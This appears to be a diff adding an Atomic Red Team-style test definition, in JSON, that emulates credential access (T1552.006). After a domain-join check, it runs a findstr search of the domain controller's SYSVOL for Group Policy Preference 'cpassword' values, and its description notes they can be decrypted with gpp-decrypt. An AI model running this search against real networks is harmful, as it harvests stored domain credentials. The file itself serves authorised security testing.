@@ -1,0 +1,78 @@
+{
+  "id": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
+  "name": "GPP Passwords (findstr)",
+  "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "3ce39c75-2133-4fbd-acb4-00247ffecd68",
+      "type": "execute-command",
+      "data": {
+        "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2141285f-06a7-485a-9867-04c01329350b",
+      "name": "Check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a344619b-bdd9-48f2-8997-30900a24152b",
+      "name": "Resolve dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Joining this computer to a domain must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ec2d6ff4-c3ec-4b1e-9998-c1c3512d18c5",
+      "name": "Re-check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "2141285f-06a7-485a-9867-04c01329350b",
+      "p": "on-success",
+      "o": "3ce39c75-2133-4fbd-acb4-00247ffecd68"
+    },
+    {
+      "s": "2141285f-06a7-485a-9867-04c01329350b",
+      "p": "on-failure",
+      "o": "a344619b-bdd9-48f2-8997-30900a24152b"
+    },
+    {
+      "s": "a344619b-bdd9-48f2-8997-30900a24152b",
+      "p": "on-success",
+      "o": "ec2d6ff4-c3ec-4b1e-9998-c1c3512d18c5"
+    },
+    {
+      "s": "ec2d6ff4-c3ec-4b1e-9998-c1c3512d18c5",
+      "p": "on-failure",
+      "o": "3ce39c75-2133-4fbd-acb4-00247ffecd68"
+    }
+  ],
+  "tags": [
+    "T1552.006",
+    "atomic-red-team"
+  ]
+}
